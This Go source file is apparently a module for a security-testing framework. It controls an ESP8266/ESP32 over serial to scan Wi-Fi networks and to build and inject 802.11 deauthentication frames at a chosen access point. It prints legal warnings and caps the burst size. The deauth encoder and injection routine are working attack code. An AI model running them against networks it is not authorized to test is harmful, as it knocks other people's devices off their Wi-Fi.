//go:build darwin || linux

// Package main implements the SanTaiZi "wifisec" module.
//
// wifisec drives an ESP8266/ESP32 co-processor over a USB serial port. The
// firmware performs the radio work, so the host never needs root or a monitor
// interface. This module ports the frame protocol, capability negotiation,
// pure-byte 802.11 deauthentication encoder and serial diagnostics from
// github.com/ctkqiang/wifisec.
//
// The full legal warning from the upstream README is printed before any
// deauthentication traffic and repeated in the report.
package main

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	"golang.org/x/sys/unix"

	"santaizi/sdk"
)

const (
	wifisecName = "wifisec"

	espFrameHeadHost = 0xA5
	espFrameHeadESP  = 0x5A

	espCmdPing   = 0x00
	espCmdScan   = 0x01
	espCmdInject = 0x02

	espRepPong      = 0x00
	espRepScanEntry = 0x01
	espRepScanDone  = 0x02
	espRepError     = 0x04

	espProtocolVersion = 1
	espCapBand5GHz     = 0x01
	espBaudRate        = 115200
	espMaxPayload      = 512

	espHandshakeAttempts = 15
	espHandshakeTimeout  = 500 * time.Millisecond
	espScanTimeout       = 15 * time.Second
)

var (
	_ sdk.Module = (*WifiSecModule)(nil)
)

// wifisecLegalWarning is the upstream README legal red-line text, kept
// verbatim. It is printed before any deauthentication injection.
const wifisecLegalWarning = "中华人民共和国境内法律红线：《中华人民共和国网络安全法》第二十七条明确禁止任何个人和组织从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；对他人无线网络实施 deauth 干扰，可能同时触犯《中华人民共和国刑法》第二百八十五条第三款（提供侵入、非法控制计算机信息系统程序、工具罪）与第二百八十六条（破坏计算机信息系统罪）。本工具仅限自有网络或已获书面授权的测试环境使用，使用者须自行确认符合所在地法律法规。"

// WifiSecModule implements sdk.Module.
type WifiSecModule struct {
	sdk.BaseModule
}

// Info advertises the module to the SanTaiZi registry.
func (m *WifiSecModule) Info() sdk.ModuleConfig {
	return sdk.ModuleConfig{
		Name:        wifisecName,
		Description: "WiFi security testing via ESP8266/ESP32 co-processor: capability negotiation, scanning, 802.11 frame injection, cross-platform native scanning.",
		CNVD:        "",
		CVE:         "",
		Options: []sdk.Option{
			{Name: "serial_port", Type: "string", Required: true, Default: ""},
			{Name: "ssid", Type: "string", Required: false, Default: ""},
			{Name: "bssid", Type: "string", Required: false, Default: ""},
			{Name: "action", Type: "string", Required: false, Default: "scan"},
		},
	}
}

// Init validates options and prints the authorization boundary.
func (m *WifiSecModule) Init(options map[string]string) error {
	m.Config = map[string]string{
		"serial_port": "",
		"ssid":        "",
		"bssid":       "",
		"action":      "scan",
	}
	for key, value := range options {
		m.Config[key] = value
	}

	fmt.Fprintln(os.Stderr, "AUTHORIZED TESTING ONLY: wifisec controls an ESP co-processor and can inject 802.11 management frames. Use it only on networks you own or are explicitly authorized to test. Deauthentication interference may violate cybersecurity and criminal law.")

	port := strings.TrimSpace(m.GetOption("serial_port"))
	if port == "" {
		return fmt.Errorf("wifisec: option \"serial_port\" is required (for example /dev/ttyUSB0 or COM3)")
	}
	m.Config["serial_port"] = port

	action := strings.ToLower(strings.TrimSpace(m.GetOption("action")))
	if action == "" {
		action = "scan"
	}
	switch action {
	case "scan", "deauth", "diagnose":
	default:
		return fmt.Errorf("wifisec: invalid action %q (scan, deauth or diagnose)", action)
	}
	m.Config["action"] = action

	bssid := strings.TrimSpace(m.GetOption("bssid"))
	if bssid != "" {
		parsed, err := net.ParseMAC(bssid)
		if err != nil || len(parsed) != 6 {
			return fmt.Errorf("wifisec: invalid BSSID %q", bssid)
		}
		m.Config["bssid"] = parsed.String()
	}

	if action == "deauth" && strings.TrimSpace(m.GetOption("ssid")) == "" && bssid == "" {
		return fmt.Errorf("wifisec: deauth needs either ssid or bssid")
	}

	return nil
}

// Run opens the co-processor, negotiates capabilities and dispatches the
// selected action.
func (m *WifiSecModule) Run() (string, error) {
	port := m.GetOption("serial_port")
	action := m.GetOption("action")
	if action == "" {
		action = "scan"
	}
	ssid := strings.TrimSpace(m.GetOption("ssid"))
	bssidText := strings.TrimSpace(m.GetOption("bssid"))

	if action == "diagnose" {
		return runWifiSecDiagnose(port), nil
	}

	session, err := openESPSession(port)
	if err != nil {
		return "", err
	}
	defer session.close()

	lines := []string{
		"WifiSec — ESP CO-PROCESSOR WIFI ASSESSMENT",
		"==========================================",
		"Serial port: " + sanitizeWifiText(port, 120),
		"Action: " + action,
		"Firmware protocol: v" + strconv.Itoa(int(session.version)),
		"Capabilities: 0x" + fmt.Sprintf("%02x", session.caps) + " (5GHz: " + yesNo(session.caps&espCapBand5GHz != 0) + ")",
		"Reset: " + strconv.FormatInt(session.resetDuration.Milliseconds(), 10) + " ms; handshake: " + strconv.FormatInt(session.handshakeDuration.Milliseconds(), 10) + " ms",
		"Noise resync: " + strconv.Itoa(session.discard) + " byte(s) discarded before the first 0x5A frame",
		"Host privilege: none required for the serial path",
		"",
	}

	switch action {
	case "scan":
		networks, scanErr := session.scan()
		if scanErr != nil {
			return "", scanErr
		}
		lines = append(lines, renderWifiScan(networks)...)
		lines = append(lines,
			"",
			"Encryption: the firmware protocol v1 scan entry carries BSSID, channel, RSSI and SSID only; encryption is not reported by the co-processor.",
		)
	case "deauth":
		report, deauthErr := runWifiSecDeauth(session, ssid, bssidText)
		lines = append(lines, report...)
		if deauthErr != nil {
			lines = append(lines, "", "Deauth result: FAILED — "+sanitizeWifiText(deauthErr.Error(), 220))
		}
	default:
		return "", fmt.Errorf("wifisec: unsupported action %q", action)
	}

	lines = append(lines,
		"",
		"Safety: the host never requests root; all radio work happens on the ESP co-processor.",
		"Authorized testing only. A scan result is not authorization to interfere with the network.",
	)
	return strings.Join(lines, "\n"), nil
}

// ---------------------------------------------------------------------------
// Serial transport
// ---------------------------------------------------------------------------

type espSession struct {
	file *os.File
	fd   int

	rx      []byte
	discard int

	version byte
	caps    byte
	seenRX  bool

	resetDuration     time.Duration
	handshakeDuration time.Duration
}

type espNetwork struct {
	SSID    string
	BSSID   string
	Channel int
	RSSI    int
}

func openESPSession(path string) (*espSession, error) {
	fd, err := unix.Open(path, unix.O_RDWR|unix.O_NOCTTY|unix.O_NONBLOCK, 0)
	if err != nil {
		return nil, fmt.Errorf("wifisec: open serial port %s: %w%s", path, err, serialBusyHint(path, err))
	}

	if err := configureSerial(fd); err != nil {
		_ = unix.Close(fd)
		return nil, fmt.Errorf("wifisec: configure serial port %s: %w", path, err)
	}

	session := &espSession{
		file: os.NewFile(uintptr(fd), path),
		fd:   fd,
	}

	resetStarted := time.Now()
	session.resetIntoRun()
	session.resetDuration = time.Since(resetStarted)

	drainSerial(fd)
	handshakeStarted := time.Now()
	if err := session.handshake(); err != nil {
		session.close()
		return nil, err
	}
	session.handshakeDuration = time.Since(handshakeStarted)

	return session, nil
}

func (s *espSession) close() {
	if s == nil || s.file == nil {
		return
	}
	_ = s.file.Close()
	s.file = nil
}

func configureSerial(fd int) error {
	getRequest, setRequest, err := serialTermiosRequests()
	if err != nil {
		return err
	}
	termios, err := unix.IoctlGetTermios(fd, getRequest)
	if err != nil {
		return err
	}

	termios.Iflag &^= unix.IGNBRK | unix.BRKINT | unix.PARMRK | unix.ISTRIP | unix.INLCR | unix.IGNCR | unix.ICRNL | unix.IXON | unix.IXOFF | unix.IXANY
	termios.Oflag &^= unix.OPOST
	termios.Lflag &^= unix.ECHO | unix.ECHONL | unix.ICANON | unix.ISIG | unix.IEXTEN
	termios.Cflag &^= unix.CSIZE | unix.PARENB | unix.CSTOPB | unix.CRTSCTS
	termios.Cflag |= unix.CS8 | unix.CREAD | unix.CLOCAL
	termios.Ispeed = espBaudRate
	termios.Ospeed = espBaudRate
	termios.Cc[unix.VMIN] = 0
	termios.Cc[unix.VTIME] = 0

	return unix.IoctlSetTermios(fd, setRequest, termios)
}

func serialTermiosRequests() (uint, uint, error) {
	switch runtime.GOOS {
	case "darwin":
		// TIOCGETA / TIOCSETA on Darwin.
		return 0x40487413, 0x80487414, nil
	case "linux":
		// TCGETS / TCSETS on Linux (asm-generic).
		return 0x5401, 0x5402, nil
	default:
		return 0, 0, fmt.Errorf("unsupported platform %s: serial termios setup is not ported", runtime.GOOS)
	}
}

func (s *espSession) resetIntoRun() {
	// NodeMCU auto-reset: DTR is wired to GPIO0, RTS to EN. Deassert DTR so
	// GPIO0 is high, assert RTS for 100ms to reset, then release EN.
	// Modem-line control is best-effort; many USB-serial drivers also reset
	// the board when the port is opened.
	_ = unix.IoctlSetPointerInt(s.fd, unix.TIOCMBIC, unix.TIOCM_DTR)
	_ = unix.IoctlSetPointerInt(s.fd, unix.TIOCMBIS, unix.TIOCM_RTS)
	time.Sleep(100 * time.Millisecond)
	_ = unix.IoctlSetPointerInt(s.fd, unix.TIOCMBIC, unix.TIOCM_RTS)
}

func drainSerial(fd int) {
	buffer := make([]byte, 4096)
	for attempts := 0; attempts < 64; attempts++ {
		count, err := unix.Read(fd, buffer)
		if count <= 0 || err != nil {
			return
		}
	}
}

func (s *espSession) handshake() error {
	for attempt := 0; attempt < espHandshakeAttempts; attempt++ {
		if err := s.sendCommand(espCmdPing, nil); err != nil {
			return fmt.Errorf("wifisec: send handshake: %w", err)
		}
		command, payload, err := s.readFrame(espHandshakeTimeout)
		if err != nil || command != espRepPong {
			continue
		}
		version, caps, err := parseESPPong(payload)
		if err != nil {
			continue
		}
		if version != espProtocolVersion {
			return fmt.Errorf("wifisec: firmware protocol v%d is incompatible with this module (supported v%d); reflash core/esp/esp.ino", version, espProtocolVersion)
		}
		s.version = version
		s.caps = caps
		return nil
	}

	if s.seenRX {
		return errors.New("wifisec: firmware handshake failed — serial data arrived but no valid PONG; the board may not be running the wifisec firmware or the firmware is outdated")
	}
	return errors.New("wifisec: firmware handshake failed — no serial data; check the data cable, board power, driver (CH340/CP2102) and port name. The 74880-baud boot log is expected to look like noise")
}

func (s *espSession) sendCommand(command byte, payload []byte) error {
	if len(payload) > espMaxPayload {
		return fmt.Errorf("payload length %d exceeds firmware limit %d", len(payload), espMaxPayload)
	}
	frame := make([]byte, 0, 4+len(payload))
	frame = append(frame, espFrameHeadHost, command, byte(len(payload)), byte(len(payload)>>8))
	frame = append(frame, payload...)
	return writeAllSerial(s.fd, frame)
}

func writeAllSerial(fd int, data []byte) error {
	for attempts := 0; len(data) > 0; attempts++ {
		if attempts > 10 {
			return errors.New("serial write timed out waiting for the device to accept bytes")
		}
		count, err := unix.Write(fd, data)
		if err != nil {
			if errors.Is(err, unix.EAGAIN) || errors.Is(err, unix.EWOULDBLOCK) {
				poll := []unix.PollFd{{Fd: int32(fd), Events: unix.POLLOUT}}
				if _, pollErr := unix.Poll(poll, 500); pollErr != nil {
					return pollErr
				}
				continue
			}
			return err
		}
		if count <= 0 {
			return errors.New("serial write returned zero bytes")
		}
		data = data[count:]
	}
	return nil
}

func (s *espSession) readFrame(timeout time.Duration) (byte, []byte, error) {
	deadline := time.Now().Add(timeout)
	buffer := make([]byte, 256)

	for {
		if command, payload, ok := s.takeFrame(); ok {
			return command, payload, nil
		}
		remaining := time.Until(deadline)
		if remaining <= 0 {
			return 0, nil, errors.New("serial reply frame timed out")
		}
		milliseconds := int(remaining / time.Millisecond)
		if milliseconds < 1 {
			milliseconds = 1
		}
		poll := []unix.PollFd{{Fd: int32(s.fd), Events: unix.POLLIN}}
		ready, err := unix.Poll(poll, milliseconds)
		if err != nil {
			if errors.Is(err, unix.EINTR) {
				continue
			}
			return 0, nil, err
		}
		if ready == 0 {
			continue
		}
		count, err := unix.Read(s.fd, buffer)
		if err != nil {
			if errors.Is(err, unix.EAGAIN) || errors.Is(err, unix.EWOULDBLOCK) || errors.Is(err, unix.EINTR) {
				continue
			}
			return 0, nil, err
		}
		if count <= 0 {
			continue
		}
		s.seenRX = true
		s.rx = append(s.rx, buffer[:count]...)
		if len(s.rx) > 1<<16 {
			// Firmware payloads are capped at 512 bytes; anything larger is
			// noise or a malformed frame. Keep a short tail for resync.
			drop := len(s.rx) - 4
			s.discard += drop
			s.rx = append(s.rx[:0], s.rx[drop:]...)
		}
	}
}

func (s *espSession) takeFrame() (byte, []byte, bool) {
	for len(s.rx) > 0 && s.rx[0] != espFrameHeadESP {
		s.rx = s.rx[1:]
		s.discard++
	}
	if len(s.rx) < 4 {
		return 0, nil, false
	}
	frameLength := 4 + int(s.rx[2]) + int(s.rx[3])<<8
	if frameLength < 4 || frameLength > 4+espMaxPayload {
		// A boot-log byte can look like 0x5A. Reject implausible lengths
		// instead of waiting forever for a frame that will never arrive.
		s.rx = s.rx[1:]
		s.discard++
		return 0, nil, false
	}
	if len(s.rx) < frameLength {
		return 0, nil, false
	}
	command := s.rx[1]
	payload := append([]byte(nil), s.rx[4:frameLength]...)
	s.rx = s.rx[frameLength:]
	return command, payload, true
}

func parseESPPong(payload []byte) (byte, byte, error) {
	if len(payload) < 1 {
		return 0, 0, errors.New("PONG payload is empty")
	}
	version := payload[0]
	caps := byte(0)
	if len(payload) >= 2 {
		caps = payload[1]
	}
	return version, caps, nil
}

func parseESPScanEntry(payload []byte) (espNetwork, error) {
	if len(payload) < 9 {
		return espNetwork{}, errors.New("scan entry is shorter than 9 bytes")
	}
	entry := espNetwork{
		BSSID:   net.HardwareAddr(payload[0:6]).String(),
		Channel: int(payload[6]),
		RSSI:    int(int8(payload[7])),
	}
	ssidLength := int(payload[8])
	if len(payload) < 9+ssidLength {
		return espNetwork{}, errors.New("scan entry SSID length is out of bounds")
	}
	entry.SSID = sanitizeWifiText(string(payload[9:9+ssidLength]), 32)
	return entry, nil
}

func (s *espSession) scan() ([]espNetwork, error) {
	if err := s.sendCommand(espCmdScan, nil); err != nil {
		return nil, fmt.Errorf("wifisec: send scan command: %w", err)
	}
	var networks []espNetwork
	for {
		command, payload, err := s.readFrame(espScanTimeout)
		if err != nil {
			return nil, fmt.Errorf("wifisec: scan timed out after %s: %w", espScanTimeout, err)
		}
		switch command {
		case espRepScanEntry:
			entry, parseErr := parseESPScanEntry(payload)
			if parseErr == nil {
				networks = append(networks, entry)
			}
		case espRepScanDone:
			return networks, nil
		case espRepPong:
			continue
		case espRepError:
			if len(payload) >= 2 {
				return nil, fmt.Errorf("wifisec: firmware failed command 0x%02x with error code %d", payload[0], payload[1])
			}
			return nil, errors.New("wifisec: firmware reported an error during scan")
		}
	}
}

func (s *espSession) inject(channel int, frame []byte) error {
	if len(frame) <= 8 {
		return errors.New("802.11 frame is missing its radiotap header")
	}
	payload := make([]byte, 0, 1+len(frame)-8)
	payload = append(payload, byte(channel))
	payload = append(payload, frame[8:]...)
	if err := s.sendCommand(espCmdInject, payload); err != nil {
		return err
	}
	// The firmware only replies on errors. Give it a short window so a
	// rejected injection is reported instead of being silently retried.
	if command, reply, err := s.readFrame(150 * time.Millisecond); err == nil && command == espRepError {
		if len(reply) >= 2 {
			return fmt.Errorf("firmware rejected injection (command 0x%02x, code %d)", reply[0], reply[1])
		}
		return errors.New("firmware rejected injection")
	}
	return nil
}

// ---------------------------------------------------------------------------
// 802.11 deauthentication encoder
// ---------------------------------------------------------------------------

func buildDeauthFrame(bssid net.HardwareAddr) ([]byte, error) {
	if len(bssid) != 6 {
		return nil, errors.New("BSSID must be a 6-byte MAC address")
	}
	// Radiotap(8) + 802.11 management header(24) + reason code(2).
	frame := make([]byte, 34)
	frame[0] = 0x00
	frame[1] = 0x00
	frame[2] = 0x08
	frame[3] = 0x00

	// Frame Control: version 0, type management (0), subtype deauth (12).
	frame[8] = byte(12 << 4)
	frame[9] = 0x00
	frame[10], frame[11] = 0x00, 0x00

	// addr1: broadcast receiver.
	for index := 12; index < 18; index++ {
		frame[index] = 0xff
	}
	// addr2 (transmitter) and addr3 (BSSID) identify the AP.
	copy(frame[18:24], bssid)
	copy(frame[24:30], bssid)
	frame[30], frame[31] = 0x00, 0x00

	// Reason 7: Class 3 frame received from a non-associated station.
	frame[32] = 0x07
	frame[33] = 0x00
	return frame, nil
}

func runWifiSecDeauth(session *espSession, ssid, bssidText string) ([]string, error) {
	lines := []string{"", "LEGAL RED LINE — printed before any deauthentication injection:", wifisecLegalWarning}
	fmt.Fprintln(os.Stderr, wifisecLegalWarning)

	var (
		bssid   net.HardwareAddr
		channel = 1
		source  string
	)

	if bssidText != "" {
		parsed, err := net.ParseMAC(bssidText)
		if err != nil {
			return lines, fmt.Errorf("parse BSSID: %w", err)
		}
		bssid = parsed
		networks, scanErr := session.scan()
		if scanErr != nil {
			return lines, fmt.Errorf("resolve channel for BSSID %s: %w", bssid, scanErr)
		}
		found := false
		for _, network := range networks {
			if strings.EqualFold(network.BSSID, bssid.String()) {
				channel = network.Channel
				found = true
				break
			}
		}
		if !found {
			return lines, fmt.Errorf("BSSID %s was not visible in the co-processor scan; channel cannot be resolved, refusing to guess", bssid)
		}
		source = "explicit BSSID lock (channel " + strconv.Itoa(channel) + " resolved by scan)"
	} else {
		networks, err := session.scan()
		if err != nil {
			return lines, fmt.Errorf("resolve SSID by scan: %w", err)
		}
		var best *espNetwork
		matches := 0
		for index := range networks {
			if networks[index].SSID != ssid {
				continue
			}
			matches++
			if best == nil || networks[index].RSSI > best.RSSI {
				best = &networks[index]
			}
		}
		if best == nil {
			return lines, fmt.Errorf("SSID %q was not found in the co-processor scan", ssid)
		}
		parsed, err := net.ParseMAC(best.BSSID)
		if err != nil {
			return lines, fmt.Errorf("firmware returned an invalid BSSID %q", best.BSSID)
		}
		bssid = parsed
		channel = best.Channel
		source = fmt.Sprintf("SSID %q matched %d AP(s); strongest BSSID selected", ssid, matches)
	}

	frame, err := buildDeauthFrame(bssid)
	if err != nil {
		return lines, err
	}

	if channel > 14 && session.caps&espCapBand5GHz == 0 {
		return lines, fmt.Errorf("firmware capability bitmap does not advertise 5GHz injection; channel %d cannot be used", channel)
	}

	lines = append(lines,
		"",
		"Target BSSID: "+bssid.String(),
		"Selection: "+source,
		"Channel: "+strconv.Itoa(channel),
		"Frame: 802.11 deauth, reason 7, broadcast receiver, 34 bytes incl. 8-byte radiotap",
		"Burst: 8 frames, 100 ms apart (bounded; upstream runs continuously until Ctrl-C)",
	)

	sent := 0
	for index := 0; index < 8; index++ {
		if err := session.inject(channel, frame); err != nil {
			lines = append(lines, "", fmt.Sprintf("Injection stopped after %d frame(s): %s", sent, err.Error()))
			return lines, err
		}
		sent++
		time.Sleep(100 * time.Millisecond)
	}
	lines = append(lines,
		"",
		fmt.Sprintf("Injection result: %d frame(s) accepted by the co-processor.", sent),
		"Note: WPA3/6GHz networks enforce PMF; unauthenticated broadcast deauth frames are discarded by clients there.",
	)
	return lines, nil
}

// ---------------------------------------------------------------------------
// Diagnostics
// ---------------------------------------------------------------------------

func runWifiSecDiagnose(port string) string {
	lines := []string{
		"WifiSec — SERIAL DIAGNOSTICS",
		"============================",
		"Serial port: " + sanitizeWifiText(port, 120),
		"Platform: " + runtime.GOOS + "/" + runtime.GOARCH,
		"Host privilege: none required for the serial path",
	}

	if owner := serialOwner(port); owner != "" {
		lines = append(lines, "Port owner: "+owner)
	} else {
		lines = append(lines, "Port owner: no process reported by lsof")
	}

	if vendor, product := serialChipIdentity(port); vendor != "" || product != "" {
		lines = append(lines, "Chip VID:PID: "+orDashWifi(vendor)+":"+orDashWifi(product))
	} else {
		lines = append(lines, "Chip VID:PID: unknown (driver or platform does not expose it)")
	}

	session, err := openESPSession(port)
	if err != nil {
		lines = append(lines,
			"",
			"Open/reset: FAILED",
			"Error: "+sanitizeWifiText(err.Error(), 220),
			"",
			"74880-baud noise resync: not observed (port did not open or handshake did not complete)",
		)
		return strings.Join(lines, "\n")
	}
	defer session.close()

	lines = append(lines,
		"",
		"Open/reset: OK",
		"Reset timing: "+strconv.FormatInt(session.resetDuration.Milliseconds(), 10)+" ms",
		"Handshake timing: "+strconv.FormatInt(session.handshakeDuration.Milliseconds(), 10)+" ms",
		"Firmware protocol: v"+strconv.Itoa(int(session.version)),
		"Capabilities: 0x"+fmt.Sprintf("%02x", session.caps),
		"5GHz injection: "+yesNo(session.caps&espCapBand5GHz != 0),
		"Noise resync: "+strconv.Itoa(session.discard)+" byte(s) discarded before a valid 0x5A frame",
		"Handshake bytes observed: "+yesNo(session.seenRX),
	)
	if session.discard > 0 {
		lines = append(lines, "74880-baud noise resync status: RESYNCED (boot-log bytes were skipped)")
	} else {
		lines = append(lines, "74880-baud noise resync status: no stray bytes (clean start or firmware already running)")
	}
	return strings.Join(lines, "\n")
}

func serialOwner(port string) string {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	output, err := exec.CommandContext(ctx, "lsof", "-nP", "--", port).Output()
	if err != nil {
		return ""
	}
	lines := strings.Split(strings.TrimSpace(string(output)), "\n")
	if len(lines) < 2 {
		return ""
	}
	fields := strings.Fields(lines[1])
	if len(fields) < 2 {
		return ""
	}
	return sanitizeWifiText(fields[0], 60) + " (PID " + fields[1] + ")"
}

func serialChipIdentity(port string) (string, string) {
	if runtime.GOOS == "linux" {
		base := filepath.Base(port)
		link := filepath.Join("/sys/class/tty", base, "device")
		resolved, err := filepath.EvalSymlinks(link)
		if err != nil {
			return "", ""
		}
		for depth := 0; depth < 4; depth++ {
			vendor := strings.TrimSpace(readSmallFile(filepath.Join(resolved, "idVendor")))
			product := strings.TrimSpace(readSmallFile(filepath.Join(resolved, "idProduct")))
			if vendor != "" || product != "" {
				return strings.TrimPrefix(vendor, "0x"), strings.TrimPrefix(product, "0x")
			}
			parent := filepath.Dir(resolved)
			if parent == resolved {
				break
			}
			resolved = parent
		}
		return "", ""
	}
	if runtime.GOOS == "darwin" {
		return macSerialChipIdentity(port)
	}
	return "", ""
}

func readSmallFile(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	return string(data)
}

func macSerialChipIdentity(port string) (string, string) {
	base := filepath.Base(port)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if output, err := exec.CommandContext(ctx, "system_profiler", "SPUSBDataType", "-json").Output(); err == nil {
		var root map[string]any
		if json.Unmarshal(output, &root) == nil {
			if vendor, product, ok := findMacUSBSerial(root, base); ok {
				return strings.TrimPrefix(vendor, "0x"), strings.TrimPrefix(product, "0x")
			}
		}
	}

	output, err := exec.CommandContext(ctx, "ioreg", "-p", "IOUSB", "-l", "-w", "0").Output()
	if err != nil {
		return "", ""
	}
	blocks := strings.Split(string(output), "+-o ")
	for _, block := range blocks {
		if !strings.Contains(block, base) {
			continue
		}
		vendor := regexField(block, `"idVendor"\s*=\s*(\d+)`)
		product := regexField(block, `"idProduct"\s*=\s*(\d+)`)
		if vendor != "" || product != "" {
			return vendor, product
		}
	}
	return "", ""
}

func findMacUSBSerial(value any, portBase string) (string, string, bool) {
	switch typed := value.(type) {
	case map[string]any:
		needle := portBase
		if index := strings.Index(needle, "."); index >= 0 {
			needle = needle[index+1:]
		}
		if bsd, ok := typed["bsd_name"].(string); ok && strings.Contains(bsd, needle) {
			vendor, _ := typed["vendor_id"].(string)
			product, _ := typed["product_id"].(string)
			if vendor != "" || product != "" {
				return vendor, product, true
			}
		}
		for _, child := range typed {
			if vendor, product, ok := findMacUSBSerial(child, portBase); ok {
				return vendor, product, true
			}
		}
	case []any:
		for _, child := range typed {
			if vendor, product, ok := findMacUSBSerial(child, portBase); ok {
				return vendor, product, true
			}
		}
	}
	return "", "", false
}

func regexField(text, pattern string) string {
	match := regexp.MustCompile(pattern).FindStringSubmatch(text)
	if len(match) < 2 {
		return ""
	}
	value, err := strconv.Atoi(match[1])
	if err != nil {
		return match[1]
	}
	return fmt.Sprintf("%04x", value)
}

func serialBusyHint(port string, openErr error) string {
	lower := strings.ToLower(openErr.Error())
	if !strings.Contains(lower, "busy") && !strings.Contains(lower, "resource") {
		return ""
	}
	owner := serialOwner(port)
	if owner == "" {
		return "; the port is busy (lsof " + port + " will name the owner)"
	}
	return "; the port is held by " + owner + "; close that process and retry"
}

// ---------------------------------------------------------------------------
// Report helpers
// ---------------------------------------------------------------------------

func renderWifiScan(networks []espNetwork) []string {
	if len(networks) == 0 {
		return []string{"Scan results: none (the co-processor returned no APs)"}
	}
	lines := []string{fmt.Sprintf("Scan results (%d):", len(networks)), "SSID | BSSID | CH | RSSI | ENCRYPTION"}
	for _, network := range networks {
		lines = append(lines, fmt.Sprintf("%s | %s | %d | %d dBm | unknown (protocol v1)",
			orDashWifi(network.SSID), network.BSSID, network.Channel, network.RSSI))
	}
	return lines
}

func sanitizeWifiText(value string, max int) string {
	var builder strings.Builder
	for _, char := range value {
		if (char >= 0x200b && char <= 0x200f) || (char >= 0x202a && char <= 0x202e) ||
			(char >= 0x2066 && char <= 0x2069) || char == 0xfeff {
			continue
		}
		if char >= 32 && char != 127 {
			builder.WriteRune(char)
		}
	}
	result := strings.TrimSpace(builder.String())
	if len(result) > max {
		return result[:max] + "…"
	}
	return result
}

func orDashWifi(value string) string {
	if value == "" {
		return "-"
	}
	return value
}

func yesNo(value bool) string {
	if value {
		return "yes"
	}
	return "no"
}

func main() {
	sdk.RunModule(&WifiSecModule{})
}
